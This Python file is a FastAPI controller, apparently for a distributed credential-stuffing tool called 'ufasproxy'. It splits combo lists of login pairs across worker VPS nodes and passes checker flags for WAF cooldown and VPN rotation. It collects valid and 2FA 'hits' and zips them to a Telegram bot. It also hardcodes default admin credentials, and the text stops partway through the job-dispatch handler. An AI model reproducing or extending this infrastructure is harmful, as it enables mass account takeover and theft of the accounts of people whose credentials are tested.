"""FastAPI Induk server: REST API, rate-limited auth, and 2-way WebSocket hub."""

from __future__ import annotations

import asyncio
import base64
import binascii
import contextlib
import hmac
import io
import os
import re
import secrets
import time
import urllib.request
import zipfile
from collections import defaultdict, deque
from contextlib import asynccontextmanager

from fastapi import Depends, FastAPI, File, Header, HTTPException, Query, Request, UploadFile, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, PlainTextResponse, Response
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from induk.backup import export_induk_bundle, restore_induk_bundle
from induk.combo_split import assign_per_vps, clean_combos, split_combos
from induk.db import IndukDB
from induk.provisioner import UnsupportedOSError, provision_via_ssh, render_bootstrap_script
from induk.vpn_pool import build_vpn_tarball, interleave_and_shard, scan_vpn_folders


class _RateLimiter:
    """Bounded in-memory sliding-window auth failure limiter (max 10 failures / 60s per IP)."""

    def __init__(self, max_fails: int = 10, window_s: float = 60.0, max_ips: int = 2048) -> None:
        self.max_fails = max_fails
        self.window_s = window_s
        self.max_ips = max_ips
        self._fails: dict[str, deque[float]] = defaultdict(deque)

    def _prune(self, ip: str, now: float) -> deque[float]:
        q = self._fails[ip]
        cut = now - self.window_s
        while q and q[0] < cut:
            q.popleft()
        return q

    def check(self, ip: str) -> None:
        now = time.monotonic()
        if ip in self._fails and len(self._prune(ip, now)) >= self.max_fails:
            raise HTTPException(status_code=429, detail="Too many failed auth attempts")

    def record_fail(self, ip: str) -> None:
        now = time.monotonic()
        if len(self._fails) >= self.max_ips and ip not in self._fails:
            cut = now - self.window_s
            stale = [k for k, q in self._fails.items() if not q or q[-1] < cut]
            for k in stale[: self.max_ips // 2]:
                self._fails.pop(k, None)
            if len(self._fails) >= self.max_ips:
                self._fails.pop(next(iter(self._fails)), None)
        self._prune(ip, now).append(now)

    def reset(self, ip: str) -> None:
        self._fails.pop(ip, None)


class Hub:
    """Manages active 2-way WebSocket connections for worker agents and browser UI clients."""

    def __init__(self) -> None:
        self.agent_sockets: dict[str, WebSocket] = {}
        self.ui_sockets: set[WebSocket] = set()

    async def push_to_agent(self, vps_id: str, message: dict) -> bool:
        ws = self.agent_sockets.get(vps_id)
        if ws is None:
            return False
        try:
            await ws.send_json(message)
            return True
        except Exception:
            if self.agent_sockets.get(vps_id) is ws:
                self.agent_sockets.pop(vps_id, None)
            return False

    async def broadcast_ui(self, event: dict) -> None:
        dead: list[WebSocket] = []
        for ws in list(self.ui_sockets):
            try:
                await ws.send_json(event)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.ui_sockets.discard(ws)

    async def close_all(self) -> None:
        for ws in list(self.agent_sockets.values()) + list(self.ui_sockets):
            try:
                await ws.close(code=1001)
            except Exception:
                pass
        self.agent_sockets.clear()
        self.ui_sockets.clear()


_VPS_ID_PAT = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
_VPS_ID_RE = r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$"
_ALLOWED_COMMANDS = {"START", "STOP", "RESTART", "ROTATE_VPN", "SYNC_VPN", "UPDATE_CODE", "BENCHMARK", "SET_INDUK"}


def _validate_safe_id(val: str, label: str = "id") -> str:
    s = (val or "").strip()
    if not _VPS_ID_PAT.match(s) or ".." in s:
        raise HTTPException(status_code=422, detail=f"Invalid {label}: {val!r}")
    return s


class RegisterNodeBody(BaseModel):
    vps_id: str = Field(min_length=1, max_length=64, pattern=_VPS_ID_RE)
    name: str = ""
    default_workers: int = Field(default=4, ge=1, le=30)
    os_info: str = ""


class BulkCommandBody(BaseModel):
    vps_ids: list[str]
    type: str
    payload: dict = Field(default_factory=dict)


class HitsBatchBody(BaseModel):
    job_id: str
    hit_type: str = "VALID"
    lines: list[str] = Field(default_factory=list)


class VpnDistributeBody(BaseModel):
    vps_ids: list[str]
    folders: list[str] = Field(default_factory=list)
    sync_now: bool = True


class JobDispatchBody(BaseModel):
    vps_ids: list[str]
    mode: str = "split"  # "split" | "per_vps"
    split_strategy: str = "weighted"  # "even" | "weighted"
    combo_text: str = ""
    per_vps_combos: dict[str, str] = Field(default_factory=dict)
    args: list[str] = Field(default_factory=list)
    workers: int | str = "auto"  # "auto" (or 0) | 1..30
    two_tab: bool | None = None
    filename: str = ""
    distribute_vpn: bool = False
    vpn_folders: list[str] = Field(default_factory=list)


class ProvisionBody(BaseModel):
    vps_id: str = Field(min_length=1, max_length=64, pattern=_VPS_ID_RE)
    name: str = ""
    mode: str = "ssh"  # "ssh" | "bootstrap"
    host: str = ""
    port: int = Field(default=22, ge=1, le=65535)
    username: str = "root"
    password: str = ""
    private_key: str = ""
    induk_url: str = ""
    repo_url: str = "https://github.com/lilvoda/ufasproxy.git"
    pointer_url: str = ""
    ufasproxy_url: str = ""
    ufasproxy_token: str = ""


_BOOL_CHECKER_FLAGS = {
    "--two-tab",
    "--no-two-tab",
    "--skip-ovpn-test",
    "--retest-ovpn",
    "--no-vpn-ip-check",
    "--no-proxy",
    "--headless",
    "--no-headless",
    "--debug",
    "--ascii",
}
_VAL_CHECKER_FLAGS = {
    "--workers",
    "--vpn-api-url",
    "--vpn-waf-threshold",
    "--waf-cooldown",
    "--vpn-rotate-every",
}


def _validate_flag_value(flag: str, val: str) -> None:
    if not val or val.startswith("-"):
        raise HTTPException(status_code=400, detail=f"{flag} requires a non-flag value")
    if flag == "--vpn-api-url":
        if not val.startswith(("http://", "https://")):
            raise HTTPException(status_code=400, detail="--vpn-api-url must start with http:// or https://")
    elif flag == "--workers":
        if val != "auto":
            try:
                w = int(val)
                if not (1 <= w <= 30):
                    raise ValueError
            except ValueError as exc:
                raise HTTPException(status_code=400, detail="--workers must be 1..30 or auto") from exc
    elif flag in ("--vpn-waf-threshold", "--vpn-rotate-every"):
        try:
            n = int(val)
            if n < 0 or n > 10000:
                raise ValueError
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=f"{flag} must be a valid integer") from exc
    elif flag == "--waf-cooldown":
        try:
            f = float(val)
            if not (1.0 <= f <= 600.0):
                raise ValueError
        except ValueError as exc:
            raise HTTPException(status_code=400, detail="--waf-cooldown must be 1..600") from exc


def _validate_checker_args(raw_args: list[str]) -> list[str]:
    clean: list[str] = []
    pending_flag = ""
    for tok in raw_args:
        s = str(tok).strip()
        if not s:
            continue
        if pending_flag:
            _validate_flag_value(pending_flag, s)
            clean.append(s)
            pending_flag = ""
            continue
        if not s.startswith("-"):
            raise HTTPException(status_code=400, detail=f"Unexpected positional arg: {s}")
        flag, has_eq, val = s.partition("=")
        if flag in _BOOL_CHECKER_FLAGS:
            if has_eq:
                raise HTTPException(status_code=400, detail=f"{flag} does not take a value")
            clean.append(flag)
        elif flag in _VAL_CHECKER_FLAGS:
            if has_eq:
                _validate_flag_value(flag, val)
                clean.append(s)
            else:
                clean.append(flag)
                pending_flag = flag
        else:
            raise HTTPException(status_code=400, detail=f"Disallowed checker flag: {flag}")
    if pending_flag:
        raise HTTPException(status_code=400, detail=f"{pending_flag} requires a value")
    return clean


class MigrateIndukBody(BaseModel):
    new_induk_url: str
    vps_ids: list[str] = Field(default_factory=list)


class LoginBody(BaseModel):
    username: str = ""
    password: str = ""


def _client_ip(request: Request) -> str:
    return request.client.host if request.client else "unknown"


def _bearer_token(auth_header: str | None) -> str:
    if not auth_header:
        return ""
    parts = auth_header.split(None, 1)
    if len(parts) == 2 and parts[0].lower() == "bearer":
        return parts[1].strip()
    return ""


_OUTPUT_RESULT_FILES = ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt")


_MAX_ZIP_UPLOAD_BYTES = 25 * 1024 * 1024
_MAX_ZIP_ENTRY_BYTES = 50 * 1024 * 1024
_MAX_ZIP_TOTAL_UNCOMPRESSED = 100 * 1024 * 1024


def _validate_and_read_output_zip(raw: bytes) -> dict[str, list[str]]:
    if len(raw) > _MAX_ZIP_UPLOAD_BYTES:
        raise ValueError(f"Output zip too large (>{_MAX_ZIP_UPLOAD_BYTES} bytes)")
    parsed: dict[str, list[str]] = {}
    total_uncompressed = 0
    with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
        for info in zf.infolist():
            b = os.path.basename(info.filename)
            if info.filename != b or b not in _OUTPUT_RESULT_FILES:
                raise ValueError(f"Disallowed entry in output zip: {info.filename}")
            if info.file_size > _MAX_ZIP_ENTRY_BYTES:
                raise ValueError(f"Zip entry too large: {info.filename}")
            total_uncompressed += info.file_size
            if total_uncompressed > _MAX_ZIP_TOTAL_UNCOMPRESSED:
                raise ValueError("Zip uncompressed payload too large")
        total_read = 0
        for info in zf.infolist():
            chunks: list[bytes] = []
            read_so_far = 0
            with zf.open(info, "r") as zmember:
                while True:
                    blk = zmember.read(65536)
                    if not blk:
                        break
                    read_so_far += len(blk)
                    total_read += len(blk)
                    if read_so_far > _MAX_ZIP_ENTRY_BYTES or total_read > _MAX_ZIP_TOTAL_UNCOMPRESSED:
                        raise ValueError(f"Zip bomb detected in {info.filename}")
                    chunks.append(blk)
            lines = [ln.strip() for ln in b"".join(chunks).decode("utf-8", errors="ignore").splitlines() if ln.strip()]
            parsed[info.filename] = lines
    return parsed


def _send_telegram_zip_sync(
    tg_token: str, tg_chat_id: str, filename: str, zip_bytes: bytes, caption: str
) -> dict:
    boundary = f"----ufpBoundary{secrets.token_hex(8)}"
    parts: list[bytes] = []
    for k, v in (("chat_id", tg_chat_id), ("caption", caption)):
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode("utf-8")
        )
    parts.append(
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
            f"Content-Type: application/zip\r\n\r\n"
        ).encode("utf-8")
        + zip_bytes
        + b"\r\n"
    )
    parts.append(f"--{boundary}--\r\n".encode("utf-8"))
    body = b"".join(parts)
    req = urllib.request.Request(
        f"https://api.telegram.org/bot{tg_token}/sendDocument",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=25.0) as resp:
        import json as _json

        return _json.loads(resp.read().decode("utf-8", "replace"))


def create_app(
    db_path: str | None = None,
    api_key: str | None = None,
    data_dir: str | None = None,
    repo_dir: str | None = None,
    username: str | None = None,
    password: str | None = None,
    tg_token: str | None = None,
    tg_chat_id: str | None = None,
) -> FastAPI:
    base_data = os.path.abspath(data_dir or os.environ.get("INDUK_DATA_DIR", "induk_data"))
    resolved_db = db_path or os.environ.get("INDUK_DB_PATH") or os.path.join(base_data, "induk.db")
    resolved_repo = os.path.abspath(repo_dir or os.environ.get("INDUK_REPO_DIR", os.getcwd()))
    resolved_user = username if username is not None else (os.environ.get("INDUK_USER") or "lilvoda")
    resolved_pass = password if password is not None else (os.environ.get("INDUK_PASS") or "adminvoda@")
    resolved_key = api_key if api_key is not None else os.environ.get("INDUK_API_KEY", "")
    resolved_tg_tok = (
        tg_token
        if tg_token is not None
        else (os.environ.get("INDUK_TG_TOKEN") or os.environ.get("UFASPROXY_TG_TOKEN") or "")
    ).strip()
    resolved_tg_chat = (
        tg_chat_id
        if tg_chat_id is not None
        else (os.environ.get("INDUK_TG_CHAT_ID") or os.environ.get("UFASPROXY_TG_CHAT_ID") or "")
    ).strip()
    offline_s = float(os.environ.get("INDUK_OFFLINE_S", "20.0"))
    stall_s = float(os.environ.get("INDUK_STALL_S", "180.0"))

    db = IndukDB(resolved_db)
    hub = Hub()
    limiter = _RateLimiter()
    agent_limiter = _RateLimiter()
    ws_tickets: dict[str, float] = {}
    ui_sessions: dict[str, float] = {}
    ssh_tasks: set[asyncio.Task[None]] = set()
    job_locks: dict[str, asyncio.Lock] = {}

    def _get_job_lock(jid: str) -> asyncio.Lock:
        lk = job_locks.get(jid)
        if lk is None:
            if len(job_locks) >= 256:
                for k in list(job_locks.keys())[:128]:
                    if not job_locks[k].locked():
                        job_locks.pop(k, None)
            lk = asyncio.Lock()
            job_locks[jid] = lk
        return lk

    @asynccontextmanager
    async def lifespan(app: FastAPI):
        os.makedirs(base_data, exist_ok=True)
        await db.init()
        try:
            yield
        finally:
            for t in list(ssh_tasks):
                t.cancel()
            if ssh_tasks:
                await asyncio.gather(*ssh_tasks, return_exceptions=True)
            await hub.close_all()
            await db.close()

    app = FastAPI(title="ufasproxy Induk Controller", lifespan=lifespan)
    app.state.db = db
    app.state.hub = hub
    app.state.data_dir = base_data
    app.state.repo_dir = resolved_repo
    app.state.api_key = resolved_key
    app.state.username = resolved_user

    def _verify_credentials(user: str, pw: str) -> bool:
        if not (resolved_user and resolved_pass):
            return False
        u_ok = hmac.compare_digest(user.encode("utf-8"), resolved_user.encode("utf-8"))
        p_ok = hmac.compare_digest(pw.encode("utf-8"), resolved_pass.encode("utf-8"))
        return bool(u_ok & p_ok)

    def _basic_auth_ok(auth_header: str | None) -> bool:
        if not auth_header:
            return False
        parts = auth_header.split(None, 1)
        if len(parts) != 2 or parts[0].lower() != "basic":
            return False
        try:
            decoded = base64.b64decode(parts[1].strip(), validate=True).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError):
            return False
        if ":" not in decoded:
            return False
        u, p = decoded.split(":", 1)
        return _verify_credentials(u, p)

    async def require_ui_auth(
        request: Request,
        x_api_key: str | None = Header(default=None, alias="X-API-Key"),
        x_ui_token: str | None = Header(default=None, alias="X-UI-Token"),
        authorization: str | None = Header(default=None, alias="Authorization"),
    ) -> None:
        ip = _client_ip(request)
        limiter.check(ip)
        now = time.monotonic()
        tok = x_ui_token or _bearer_token(authorization)
        tok_ok = bool(tok and ui_sessions.get(tok, 0.0) > now)
        key_ok = bool(resolved_key and x_api_key and hmac.compare_digest(x_api_key, resolved_key))
        basic_ok = _basic_auth_ok(authorization)
        if not (tok_ok or key_ok or basic_ok):
            limiter.record_fail(ip)
            raise HTTPException(status_code=401, detail="Invalid credentials")
        limiter.reset(ip)

    async def require_agent_auth(
        request: Request,
        authorization: str | None = Header(default=None, alias="Authorization"),
    ) -> str:
        ip = _client_ip(request)
        agent_limiter.check(ip)
        tok = _bearer_token(authorization)
        vps_id = await db.verify_agent_token(tok)
        if not vps_id:
            agent_limiter.record_fail(ip)
            raise HTTPException(status_code=401, detail="Invalid agent token")
        agent_limiter.reset(ip)
        return vps_id

    app.state.require_ui_auth = require_ui_auth
    app.state.require_agent_auth = require_agent_auth

    async def _push_command_to_node(vps_id: str, cmd_type: str, payload: dict) -> dict:
        cmd = await db.enqueue_command(vps_id, cmd_type, payload)
        if await hub.push_to_agent(vps_id, {"type": "command", "command": cmd}):
            await db.mark_delivered([cmd["cmd_id"]])
        return cmd

    app.state.push_command_to_node = _push_command_to_node

    @app.get("/api/v1/health")
    async def health():
        wal = await db.wal_mode()
        return {"ok": True, "db": wal.lower(), "agents_online": len(hub.agent_sockets)}

    @app.post("/api/v1/auth/login")
    async def ui_login(body: LoginBody, request: Request):
        ip = _client_ip(request)
        limiter.check(ip)
        if not _verify_credentials(body.username.strip(), body.password):
            limiter.record_fail(ip)
            raise HTTPException(status_code=401, detail="Invalid username or password")
        limiter.reset(ip)
        now = time.monotonic()
        for k in [k for k, exp in ui_sessions.items() if exp <= now]:
            ui_sessions.pop(k, None)
        if len(ui_sessions) >= 128:
            ui_sessions.pop(next(iter(ui_sessions)), None)
        tok = secrets.token_urlsafe(32)
        ui_sessions[tok] = now + 86400.0
        return {"ok": True, "token": tok, "username": resolved_user}

    @app.post("/api/v1/auth/logout")
    async def ui_logout(
        x_ui_token: str | None = Header(default=None, alias="X-UI-Token"),
        authorization: str | None = Header(default=None, alias="Authorization"),
    ):
        tok = x_ui_token or _bearer_token(authorization)
        if tok:
            ui_sessions.pop(tok, None)
        return {"ok": True}

    @app.post("/api/v1/ui/ws-ticket", dependencies=[Depends(require_ui_auth)])
    async def issue_ws_ticket():
        now = time.monotonic()
        expired = [k for k, exp in ws_tickets.items() if exp <= now]
        for k in expired:
            ws_tickets.pop(k, None)
        ticket = secrets.token_urlsafe(24)
        ws_tickets[ticket] = now + 30.0
        return {"ticket": ticket}

    @app.get("/api/v1/vps", dependencies=[Depends(require_ui_auth)])
    async def list_vps():
        nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
        return {"nodes": nodes, "summary": summary}

    @app.post("/api/v1/vps", status_code=201, dependencies=[Depends(require_ui_auth)])
    async def register_vps(body: RegisterNodeBody):
        vid = _validate_safe_id(body.vps_id, "vps_id")
        raw_token = secrets.token_urlsafe(32)
        node = await db.register_node(
            vid, body.name.strip() or vid, body.default_workers, raw_token, os_info=body.os_info
        )
        return {**node, "agent_token": raw_token}

    @app.post("/api/v1/vps/{vps_id}/rotate-token", dependencies=[Depends(require_ui_auth)])
    async def rotate_token(vps_id: str):
        vid = _validate_safe_id(vps_id, "vps_id")
        raw_token = secrets.token_urlsafe(32)
        if not await db.rotate_node_token(vid, raw_token):
            raise HTTPException(status_code=404, detail="VPS not found")
        old_ws = hub.agent_sockets.pop(vid, None)
        if old_ws is not None:
            with contextlib.suppress(Exception):
                await old_ws.close(code=4001)
        return {"vps_id": vid, "agent_token": raw_token}

    @app.delete("/api/v1/vps/{vps_id}", dependencies=[Depends(require_ui_auth)])
    async def remove_vps(vps_id: str):
        vid = _validate_safe_id(vps_id, "vps_id")
        old_ws = hub.agent_sockets.pop(vid, None)
        if old_ws is not None:
            with contextlib.suppress(Exception):
                await old_ws.close(code=4001)
        if not await db.delete_node(vid):
            raise HTTPException(status_code=404, detail="VPS not found")
        return {"deleted": vid}

    @app.post("/api/v1/commands/bulk", dependencies=[Depends(require_ui_auth)])
    async def bulk_commands(body: BulkCommandBody):
        ctype = body.type.strip().upper()
        if ctype not in _ALLOWED_COMMANDS:
            raise HTTPException(status_code=400, detail=f"Unknown command type: {ctype}")
        nodes, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
        known = {n["vps_id"] for n in nodes}
        unknown = [vid for vid in body.vps_ids if vid not in known]
        if unknown:
            raise HTTPException(status_code=404, detail=f"Unknown VPS IDs: {', '.join(unknown)}")
        queued = [await _push_command_to_node(vid, ctype, body.payload) for vid in body.vps_ids]
        return {"ok": True, "queued": queued}

    @app.get("/api/v1/jobs", dependencies=[Depends(require_ui_auth)])
    async def list_jobs():
        jobs = await db.list_jobs()

        def _annotate() -> None:
            for j in jobs:
                jdir = os.path.join(base_data, "jobs", j["job_id"])
                odir = os.path.join(jdir, "outputs")
                j["outputs_count"] = len(os.listdir(odir)) if os.path.isdir(odir) else 0
                j["tg_sent"] = os.path.isfile(os.path.join(jdir, ".tg_sent"))

        await asyncio.to_thread(_annotate)
        return {"jobs": jobs, "tg_configured": bool(resolved_tg_tok and resolved_tg_chat)}

    async def _build_job_zip(job_id: str) -> tuple[str, bytes, dict]:
        job = await db.get_job(job_id)
        if not job:
            raise HTTPException(status_code=404, detail=f"Job not found: {job_id}")
        valid_rows = await db.export_hits(job_id, hit_type="VALID", dedup="per_job")
        otp_rows = await db.export_hits(job_id, hit_type="OTP", dedup="per_job")

        def _assemble() -> tuple[str, bytes, dict]:
            merged: dict[str, list[str]] = {fn: [] for fn in _OUTPUT_RESULT_FILES}
            seen_valid: set[str] = set()
            seen_otp: set[str] = set()
            for row in valid_rows:
                ln = row["raw_line"].strip()
                if ln and ln not in seen_valid:
                    seen_valid.add(ln)
                    merged["hit_valid.txt"].append(ln)
            for row in otp_rows:
                ln = row["raw_line"].strip()
                if ln and ln not in seen_otp:
                    seen_otp.add(ln)
                    merged["hit_2fa.txt"].append(ln)

            out_dir = os.path.join(base_data, "jobs", job_id, "outputs")
            if os.path.isdir(out_dir):
                for fn in sorted(os.listdir(out_dir)):
                    if not fn.endswith(".zip"):
                        continue
                    zpath = os.path.join(out_dir, fn)
                    try:
                        with open(zpath, "rb") as f:
                            parsed = _validate_and_read_output_zip(f.read())
                        for base_name, lines in parsed.items():
                            for s in lines:
                                if base_name == "hit_valid.txt":
                                    if s in seen_valid:
                                        continue
                                    seen_valid.add(s)
                                elif base_name == "hit_2fa.txt":
                                    if s in seen_otp:
                                        continue
                                    seen_otp.add(s)
                                merged[base_name].append(s)
                    except Exception:
                        continue

            cfg = job.get("config") or {}
            stem = re.sub(r"[^A-Za-z0-9._-]+", "_", str(cfg.get("filename") or "").strip()).strip("._-")
            zip_name = f"{stem}_{job_id}.zip" if stem else f"{job_id}.zip"
            counts = {fn: len(lines) for fn, lines in merged.items()}
            summary_txt = "\n".join(
                [
                    f"Job ID   : {job_id}",
                    f"Input    : {stem or '-'}",
                    f"VPS      : {', '.join(cfg.get('vps_ids') or []) or '-'}",
                    f"Valid    : {counts['hit_valid.txt']}",
                    f"2FA/OTP  : {counts['hit_2fa.txt']}",
                    f"Invalid  : {counts['invalid.txt']}",
                    f"Error    : {counts['err.txt']}",
                ]
            ) + "\n"
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("summary.txt", summary_txt.encode("utf-8"))
                for fn in _OUTPUT_RESULT_FILES:
                    if merged[fn]:
                        zf.writestr(fn, ("\n".join(merged[fn]) + "\n").encode("utf-8"))
            return zip_name, buf.getvalue(), counts

        return await asyncio.to_thread(_assemble)

    async def _dispatch_job_tg_zip(job_id: str) -> dict:
        if not (resolved_tg_tok and resolved_tg_chat):
            raise HTTPException(status_code=400, detail="Telegram token/chat_id belum dikonfigurasi")
        zip_name, zbytes, counts = await _build_job_zip(job_id)
        caption = (
            f"📦 Output {zip_name}\n"
            f"VALID: {counts['hit_valid.txt']} | 2FA: {counts['hit_2fa.txt']} | "
            f"INVALID: {counts['invalid.txt']} | ERR: {counts['err.txt']}"
        )
        res = await asyncio.to_thread(
            _send_telegram_zip_sync, resolved_tg_tok, resolved_tg_chat, zip_name, zbytes, caption
        )
        ok = bool(res.get("ok") is True)
        if not ok:
            raise HTTPException(status_code=502, detail=f"Telegram API failed: {res}")

        def _mark_sent() -> None:
            jdir = os.path.join(base_data, "jobs", job_id)
            os.makedirs(jdir, exist_ok=True)
            with open(os.path.join(jdir, ".tg_sent"), "w", encoding="utf-8") as f:
                f.write(str(time.time()))

        await asyncio.to_thread(_mark_sent)
        return {"ok": True, "zip_name": zip_name, "counts": counts}

    @app.get("/api/v1/results/{job_id}/zip", dependencies=[Depends(require_ui_auth)])
    async def download_results_zip(job_id: str):
        jid = _validate_safe_id(job_id, "job_id")
        async with _get_job_lock(jid):
            zip_name, zbytes, _ = await _build_job_zip(jid)
        return Response(
            zbytes,
            media_type="application/zip",
            headers={"Content-Disposition": f'attachment; filename="{zip_name}"'},
        )

    @app.post("/api/v1/results/{job_id}/telegram", dependencies=[Depends(require_ui_auth)])
    async def send_results_telegram(job_id: str):
        jid = _validate_safe_id(job_id, "job_id")
        async with _get_job_lock(jid):
            return await _dispatch_job_tg_zip(jid)

    @app.get("/api/v1/results/{job_id}", dependencies=[Depends(require_ui_auth)])
    async def get_results(
        job_id: str,
        hit_type: str = Query(default="VALID"),
        dedup: str = Query(default="per_job"),
        format: str = Query(default="json"),
    ):
        target_job = None if job_id == "all" else _validate_safe_id(job_id, "job_id")
        rows = await db.export_hits(target_job, hit_type=hit_type, dedup=dedup)
        if format == "txt":
            body = "\n".join(r["raw_line"] for r in rows) + ("\n" if rows else "")
            return PlainTextResponse(body, media_type="text/plain; charset=utf-8")
        return {"job_id": job_id, "hit_type": hit_type.upper(), "dedup": dedup, "count": len(rows), "hits": rows}

    @app.get("/api/v1/agent/pending-commands")
    async def pending_commands(vps_id: str = Depends(require_agent_auth)):
        cmds = await db.get_unacked_commands(vps_id)
        await db.mark_delivered([c["cmd_id"] for c in cmds])
        await db.touch_seen(vps_id)
        return {"commands": cmds}

    @app.post("/api/v1/agent/hits")
    async def upload_hits(body: HitsBatchBody, vps_id: str = Depends(require_agent_auth)):
        jid = _validate_safe_id(body.job_id, "job_id")
        inserted, received = await db.insert_hits(jid, vps_id, body.hit_type, body.lines)
        await db.touch_seen(vps_id)
        if inserted > 0:
            await hub.broadcast_ui({"type": "hits_added", "job_id": jid, "vps_id": vps_id, "hit_type": body.hit_type, "inserted": inserted})
        return {"ok": True, "inserted": inserted, "received": received}

    @app.post("/api/v1/agent/output/{job_id}")
    async def upload_agent_output(job_id: str, request: Request, vps_id: str = Depends(require_agent_auth)):
        jid = _validate_safe_id(job_id, "job_id")
        job = await db.get_job(jid)
        if not job:
            raise HTTPException(status_code=404, detail=f"Job not found: {jid}")
        expected = set((job.get("config") or {}).get("vps_ids") or [])
        if expected and vps_id not in expected:
            raise HTTPException(status_code=403, detail="VPS not assigned to this job")

        chunks: list[bytes] = []
        total_rx = 0
        async for chunk in request.stream():
            total_rx += len(chunk)
            if total_rx > _MAX_ZIP_UPLOAD_BYTES:
                raise HTTPException(status_code=413, detail="Output zip too large")
            chunks.append(chunk)
        raw = b"".join(chunks)

        try:
            await asyncio.to_thread(_validate_and_read_output_zip, raw)
        except ValueError as ve:
            raise HTTPException(status_code=400, detail=str(ve))
        except Exception as exc:
            raise HTTPException(status_code=400, detail="Invalid output zip") from exc

        async with _get_job_lock(jid):
            def _save_and_check() -> tuple[set[str], bool]:
                jdir = os.path.join(base_data, "jobs", jid)
                odir = os.path.join(jdir, "outputs")
                os.makedirs(odir, exist_ok=True)
                with open(os.path.join(odir, f"{vps_id}.zip"), "wb") as f:
                    f.write(raw)
                done = {fn[:-4] for fn in os.listdir(odir) if fn.endswith(".zip")}
                sent = os.path.isfile(os.path.join(jdir, ".tg_sent"))
                return done, sent

            done_vps, already_sent = await asyncio.to_thread(_save_and_check)
            await db.touch_seen(vps_id)

            tg_auto_sent = False
            if expected and expected.issubset(done_vps) and resolved_tg_tok and resolved_tg_chat and not already_sent:
                with contextlib.suppress(Exception):
                    await _dispatch_job_tg_zip(jid)
                    tg_auto_sent = True

        await hub.broadcast_ui({"type": "job_output_ready", "job_id": jid, "vps_id": vps_id, "tg_sent": tg_auto_sent})
        return {"ok": True, "job_id": jid, "tg_auto_sent": tg_auto_sent}

    @app.get("/api/v1/vpn/pool", dependencies=[Depends(require_ui_auth)])
    async def get_vpn_pool():
        pool = scan_vpn_folders(resolved_repo)
        return {
            "folders": {k: {"count": len(v["ovpns"]), "has_auth": bool(v["auth"])} for k, v in pool.items()},
            "total": sum(len(v["ovpns"]) for v in pool.values()),
        }

    async def _distribute_vpn_shards(vps_ids: list[str], folders: list[str] | None, sync_now: bool) -> dict:
        nodes, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
        by_id = {n["vps_id"]: n for n in nodes}
        unknown = [vid for vid in vps_ids if vid not in by_id]
        if unknown:
            raise HTTPException(status_code=404, detail=f"Unknown VPS IDs: {', '.join(unknown)}")
        busy = [
            vid for vid in vps_ids
            if by_id.get(vid, {}).get("effective_state") in ("RUNNING", "STARTING", "ROTATING")
        ]
        if busy:
            raise HTTPException(
                status_code=409,
                detail={"message": "Cannot distribute VPN to running nodes", "busy_nodes": busy},
            )
        try:
            pool = scan_vpn_folders(resolved_repo, folders or None)
        except ValueError as ve:
            raise HTTPException(status_code=400, detail=str(ve))
        if not pool:
            raise HTTPException(status_code=400, detail="No .ovpn folders found")
        shards = interleave_and_shard(pool, vps_ids)
        vpn_dir = os.path.join(base_data, "vpn_pool")
        os.makedirs(vpn_dir, exist_ok=True)
        counts: dict[str, int] = {}
        for vid, entries in shards.items():
            bundle = await asyncio.to_thread(build_vpn_tarball, entries)
            with open(os.path.join(vpn_dir, f"{vid}.tar.gz"), "wb") as f:
                f.write(bundle)
            counts[vid] = len(entries)
            if sync_now:
                await _push_command_to_node(vid, "SYNC_VPN", {})
        return {"ok": True, "distributed": counts}

    @app.post("/api/v1/vpn/distribute", dependencies=[Depends(require_ui_auth)])
    async def distribute_vpn(body: VpnDistributeBody):
        return await _distribute_vpn_shards(body.vps_ids, body.folders, body.sync_now)

    @app.get("/api/v1/agent/vpn-bundle/{target_vps_id}")
    async def download_vpn_bundle(target_vps_id: str, vps_id: str = Depends(require_agent_auth)):
        if target_vps_id != vps_id:
            raise HTTPException(status_code=403, detail="Forbidden")
        fp = os.path.join(base_data, "vpn_pool", f"{vps_id}.tar.gz")
        if not os.path.isfile(fp):
            raise HTTPException(status_code=404, detail="VPN bundle not prepared for this VPS")
        return FileResponse(fp, media_type="application/gzip")

    @app.post("/api/v1/jobs/dispatch", dependencies=[Depends(require_ui_auth)])
    async def dispatch_job(body: JobDispatchBody):
        if not body.vps_ids:
            raise HTTPException(status_code=400, detail="No VPS selected")
        validated_args = _validate_checker_args(body.args)
        nodes, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
        by_id = {n["vps_id"]: n for n in nodes}
        unknown = [vid for vid in body.vps_ids if vid not in by_id]
        if unknown:
            raise HTTPException(status_code=404, detail=f"Unknown VPS IDs: {', '.join(unknown)}")

        if body.mode == "per_vps":
            assignments = assign_per_vps({vid: body.per_vps_combos.get(vid, "") for vid in body.vps_ids})
            if not any(assignments.get(vid) for vid in body.vps_ids):
                raise HTTPException(status_code=400, detail="Per-VPS combo inputs are empty")
        else:
            lines = clean_combos(body.combo_text)
            if not lines:
                raise HTTPException(status_code=400, detail="Combo list is empty")
            weights = {
                vid: (1 if body.split_strategy == "even" else int((by_id.get(vid) or {}).get("default_workers") or 4))
                for vid in body.vps_ids
            }
            assignments = split_combos(lines, weights)

        if body.distribute_vpn:
            await _distribute_vpn_shards(body.vps_ids, body.vpn_folders, sync_now=False)

        w_raw = str(body.workers or "auto").strip().lower()
        if w_raw in ("0", "auto", ""):
            w_val = "auto"
        else:
            if not w_raw.isdigit() or not (1 <= int(w_raw) <= 30):
                raise HTTPException(status_code=400, detail="workers must be 'auto' or 1..30")
            w_val = str(int(w_raw))
